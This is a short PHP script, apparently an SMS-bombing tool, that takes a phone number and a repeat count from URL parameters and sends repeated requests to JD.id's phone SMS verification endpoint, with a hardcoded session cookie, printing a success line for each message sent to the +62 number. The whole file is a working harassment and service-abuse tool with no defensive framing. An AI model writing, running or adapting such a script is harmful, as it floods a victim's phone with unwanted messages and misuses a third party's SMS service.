
<?php
session_start();
error_reporting(0); 
if (empty($_SESSION['username'])) {
echo '{"error":-1,"msg":"Error! You Not Login!"}';
exit;
}
?>
<?php


if(!$_GET['no']){ 
echo "Hanya Sebuah Sabunku ";
}else{
$loop = $_GET['loop'];
$no = $_GET['no'];
            $header = array(
            'Host: http://sc.jd.id/phone/sendPhoneSms',
            'Connection: keep-alive',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
            'Origin: http://sc.jd.id/phone/sendPhoneSms',
            'Content-Type: application/x-www-form-urlencoded',
            'Referer: http://sc.jd.id/phone/sendPhoneSms',
            'Cookie: ci_session=d68m3b8025eua63qro65ehtkiuqo5khn; BIGipServer~PART_TIER1~REG_REREG_WEBPOOL_81=rd1o00000000000000000000ffff0a0d1e2eo81; f5avrbbbbbbbbbbbbbbbb=GIEMAEIJMHNNGPBBJCLHNECCHELPNLGNNMPIGNMOIHIPJCKCFNMFHLPMCBMFANCBMBGDLGMHPHNJPONMAKKALHHDDDCMEKHACDOIAKHIBPIKBCLPHDKOPKLBMHHMFKJI; _ga=GA1.3.1872665430.1509454404; _gid=GA1.3.422968672.1511602060; _gat_gtag_UA_108271886_1=1',
            'Accept-Encoding: gzip, deflate, br',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: max-age=0',);
    function http($postdata){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'http://sc.jd.id/phone/sendPhoneSms');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        if(!empty($postdata)){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        $response = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return array($http, $response);
    }
    for ($x = 0;$x <= $loop ;$x++) {
    http("phone=".$no."&smsType=1"); 
    echo "SMS ke +62".$no." Sukses<br>";
}
}

?>